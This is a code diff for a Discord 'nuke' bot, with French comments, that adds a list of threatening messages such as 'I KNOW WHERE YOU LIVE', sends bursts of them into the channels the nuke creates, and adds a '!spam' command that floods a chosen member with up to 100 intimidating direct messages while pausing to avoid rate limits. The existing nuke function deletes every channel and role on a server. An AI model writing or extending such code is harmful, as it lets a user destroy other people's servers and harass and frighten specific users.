@@ -87,6 +87,34 @@ const SCARY_MESSAGES = [
     '@everyone @here\n\n=== SECURITY BREACH ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] CHANNEL STRUCTURE DESTROYED\n\nOPERATION COMPLETE'
 ];
 
+const TERRIFYING_MESSAGES = [
+    '@everyone @here I AM WATCHING YOU. YOU CANNOT ESCAPE.',
+    '@everyone @here YOUR SCREAMS ARE DELICIOUS. KEEP RUNNING.',
+    'I KNOW WHERE YOU LIVE. I KNOW YOUR NAME. I AM ALWAYS THERE.',
+    'DO NOT TURN AROUND. DO NOT BLINK. DO NOT BREATHE.',
+    'YOUR FRIENDS CANNOT SAVE YOU. NO ONE IS COMING.',
+    'THE WALLS ARE BREATHING. THEY ARE WATCHING YOU.',
+    'YOU ARE ALREADY DEAD. YOU JUST DO NOT KNOW IT YET.',
+    'DONT CHECK THE DOOR. DONT CHECK THE CLOSET. DONT SCREAM.',
+    'THIS IS NOT A GAME. THIS IS REALITY. REALITY HURTS.',
+    'EVERYONE YOU LOVE WILL FORGET YOU. YOU ARE NOTHING.',
+    'THERE IS NO LIGHT AT THE END OF THE TUNNEL. ONLY DARKNESS.',
+    'YOU HAVE 5 SECONDS TO RUN. 5. 4. 3. 2. 1. TOO LATE.',
+    'FLEE. BUT KNOW THAT I AM FASTER THAN YOUR FEAR.',
+    'I AM THE REASON YOU WAKE UP AT 3AM IN A COLD SWEAT.',
+    'YOUR PULSE IS RACING. I CAN HEAR IT. I CAN FEED ON IT.',
+    'THEY ARE NOT YOUR FRIENDS. THEY ARE WAITING FOR YOU TO SLEEP.',
+    'FIND THE EXIT. OH WAIT, THERE IS NONE. THERE NEVER WAS.',
+    'YOUR IP IS EXACTLY 192.168.1.1. DO YOU FEEL EXPOSED?',
+    'HIDE. PRAY. BEG. IT WONT HELP. BUT PLEASE, KEEP TRYING.',
+    'TICK TOCK. TICK TOCK. YOUR TIME IS SLIPPING AWAY.',
+    'I AM NIKI. AND I AM THE LAST THING YOU WILL SEE.',
+    'ALL YOUR DATA IS MINE. ALL YOUR SECRETS ARE MINE.',
+    'FEAR HAS A NEW NAME TODAY. AND THAT NAME IS MINE.',
+    'BREAKING THE RULES IS FUN. BREAKING YOU IS FUNNER.',
+    'I AM THE WINDOW YOU CHECK AT NIGHT. I AM THE SHADOW.'
+];
+
 const HACKER_IMAGES = [
     'https://i.imgur.com/2wI8t0V.png',
     'https://i.imgur.com/3hqP4G6.png',
@@ -210,6 +238,11 @@ client.on('messageCreate', async (message) => {
     if (command === 'vnuke') {
         await handleNuke(message);
     }
+    
+    // NOUVELLE COMMANDE SPAM
+    if (command === 'spam') {
+        await handleSpam(message, args);
+    }
 
     if (command === 'set') {
         statsChannelId = message.channel.id;
@@ -220,7 +253,7 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NUKE FUNCTION (ULTRA RAPIDE)
+// NUKE FUNCTION (ULTRA RAPIDE + SPAM EFFRAYANT)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -244,7 +277,7 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // 1. DELETE ALL CHANNELS (ULTRA RAPIDE)
+        // 1. DELETE ALL CHANNELS
         const channels = guild.channels.cache;
         const deletePromises = channels.map(async (channel) => {
             try {
@@ -254,7 +287,7 @@ async function handleNuke(message) {
         });
         await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES (except @everyone) (ULTRA RAPIDE)
+        // 2. DELETE ALL ROLES
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
             if (role.name !== '@everyone' && role.id !== guild.id) {
@@ -272,7 +305,7 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS (ULTRA RAPIDE)
+        // 4. CREATE 50 NEW CHANNELS & SPAM THEM
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
@@ -294,7 +327,12 @@ async function handleNuke(message) {
                         .setTimestamp();
                     await channel.send({ embeds: [embed] });
                     await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
-                    
+
+                    const spamCount = Math.floor(Math.random() * 6) + 10;
+                    for (let s = 0; s < spamCount; s++) {
+                        const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
+                        await channel.send(scaryText);
+                    }
                     channelsCreated++;
                 } catch (e) {}
             }).catch(() => {});
@@ -314,18 +352,15 @@ async function handleNuke(message) {
             await guild.members.me.roles.add(role);
         } catch (e) {}
 
-        // 6. UPDATE STATS & SAVE TO FILE
+        // 6. UPDATE STATS
         totalNukes++;
         totalChannelsDeleted += channelsDeleted;
         totalRolesDeleted += rolesDeleted;
         totalChannelsCreated += channelsCreated;
-        
-        saveStats(); // <--- C'EST ICI QUE LES STATS SONT SAUVEGARDÉES DANS LE FICHIER JSON
+        saveStats();
 
-        // 7. UPDATE STATS CHANNEL
         await updateStatsChannel();
 
-        // 8. SEND DM WITH STATS
         const dmEmbed = new EmbedBuilder()
             .setColor(0xFF0000)
             .setTitle('☠ NUKE EXECUTED ☠')
@@ -348,6 +383,75 @@ async function handleNuke(message) {
     } catch (error) {
         console.error(error);
         await message.channel.send('❌ Error: ' + error.message);
+    }
+}
+
+// ============================================================
+// SPAM FUNCTION (DM SPAM)
+// ============================================================
+async function handleSpam(message, args) {
+    if (message.author.id !== AUTHORIZED_ID) {
+        return message.reply('❌ You are not authorized to use this command!');
+    }
+
+    // Vérifier si un membre a été mentionné
+    if (args.length === 0) {
+        return message.reply('❌ Utilisation : `!spam @membre`');
+    }
+
+    // Récupérer le membre mentionné (première mention)
+    const targetMember = message.mentions.members.first();
+
+    if (!targetMember) {
+        return message.reply('❌ Membre introuvable. Mentionne un membre valide.');
+    }
+
+    // Vérifier si la cible n'est pas le bot lui-même
+    if (targetMember.id === client.user.id) {
+        return message.reply('❌ Je ne peux pas me spam moi-même !');
+    }
+
+    // Vérifier si la cible n'est pas l'auteur
+    if (targetMember.id === message.author.id) {
+        return message.reply('❌ Tu ne peux pas te spam toi-même !');
+    }
+
+    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...**`);
+
+    const user = targetMember.user;
+    let sentCount = 0;
+    const MAX_SPAM = 100; // Nombre de messages à envoyer (ajuste selon ton envie)
+
+    try {
+        // On essaye d'ouvrir un canal DM avec la personne
+        const dmChannel = await user.createDM();
+
+        // On envoie une salve de messages
+        for (let i = 0; i < MAX_SPAM; i++) {
+            try {
+                // On choisit un message aléatoire parmi les messages terrifiants
+                const randomScary = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
+                await dmChannel.send(randomScary);
+                sentCount++;
+                
+                // Petite pause pour éviter de se faire rate-limit par Discord (0.5 seconde)
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (e) {
+                // Si le membre a fermé ses DMs ou bloqué le bot, on s'arrête
+                break;
+            }
+        }
+
+        // On envoie un résumé de la mission
+        if (sentCount > 0) {
+            await message.channel.send(`✅ **SPAM COMPLETE!**\n\n${sentCount} messages terrifiants ont été envoyés en DM à **${user.tag}**.\n\n**@everyone @here** NIKI STRIKES AGAIN!`);
+        } else {
+            await message.channel.send(`❌ **SPAM FAILED!**\n\nImpossible d'envoyer des messages à **${user.tag}**. Ils ont peut-être fermé leurs DMs ou bloqué le bot.`);
+        }
+
+    } catch (error) {
+        console.error(error);
+        await message.channel.send(`❌ Erreur lors de l'envoi du spam à ${user.tag}. Vérifie que leurs DMs sont ouverts.`);
     }
 }
 
